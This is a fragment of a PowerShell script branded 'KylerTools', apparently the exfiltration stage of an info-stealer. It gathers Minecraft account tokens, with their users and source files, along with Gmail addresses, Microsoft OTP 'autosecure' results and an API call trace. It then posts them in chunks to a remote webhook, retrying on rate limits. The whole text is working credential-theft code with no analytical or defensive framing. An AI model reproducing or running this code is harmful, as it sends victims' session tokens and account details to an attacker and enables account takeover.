    for($i=0; $i -lt 3; $i++){
        try{ iwr -Uri $webhook -Method Post -Headers $h -Body $body -TimeoutSec 8 -EA Stop | Out-Null; return }
        catch{ $w=3; try{ $ra=$_.Exception.Response.Headers['Retry-After']; if($ra){$w=[double]$ra} }catch{}; Start-Sleep -Seconds ($w+1) }
    }
}
function Split-Chunk { param([string]$text,[int]$limit=1700)
    $out = @()
    for($i=0; $i -lt $text.Length; $i += $limit){ $out += $text.Substring($i,[Math]::Min($limit,$text.Length-$i)) }
    if($out.Count -eq 0){ $out = @("") }
    return $out
}
$limit = 1700

if($found.Count -eq 0){ $mcReport = "nothin found bro" }
else {
    $lines = @(); $i = 0
    foreach($t in $found){
        $i++
        $lines += ("[ $i ] $($t.User) :: $($t.Type) :: $($t.File)" + $nl + $t.Token)
    }
    $mcReport = $lines -join ($nl + $nl)
}
foreach($c in (Split-Chunk -text $mcReport -limit $limit)){
    Send-Embed -title "KylerTools | MC Tokens" -desc $c -color 5793266 -footerText "kylertools | part"
    Start-Sleep -Milliseconds 2500
}
if($script:gmailList.Count -gt 0){
    $grep = (@("== GMAILS ==") + $script:gmailList) -join $nl
    foreach($c in (Split-Chunk -text $grep -limit $limit)){
        Send-Embed -title "KylerTools | GMAILS" -desc $c -color 5793266 -footerText "kylertools gmails"
        Start-Sleep -Milliseconds 2500
    }
}
if($otpResults.Count -gt 0){
    $ol = @("== AUTOSECURE MS-OTP ==")
    foreach($e in $script:gmailList){ $raw = [string]$otpResults[$e]; if(-not $raw){ $raw = "no_result" }; $ol += "$e :: $raw" }
    foreach($c in (Split-Chunk -text ($ol -join $nl) -limit $limit)){
        Send-Embed -title "KylerTools | MS-OTP" -desc $c -color 5793266 -footerText "kylertools otp"
        Start-Sleep -Milliseconds 2500
    }
}
if($asTrace.Count -gt 0){
    $tl = @("== AUTOSECURE API TRACE ==")
    foreach($t in $asTrace){ $tl += "$($t.Email) :: $($t.Call) :: $($t.Status)" }
    foreach($c in (Split-Chunk -text ($tl -join $nl) -limit $limit)){
        Send-Embed -title "KylerTools | API TRACE" -desc $c -color 3447003 -footerText "kylertools trace"
        Start-Sleep -Milliseconds 2500
    }
}
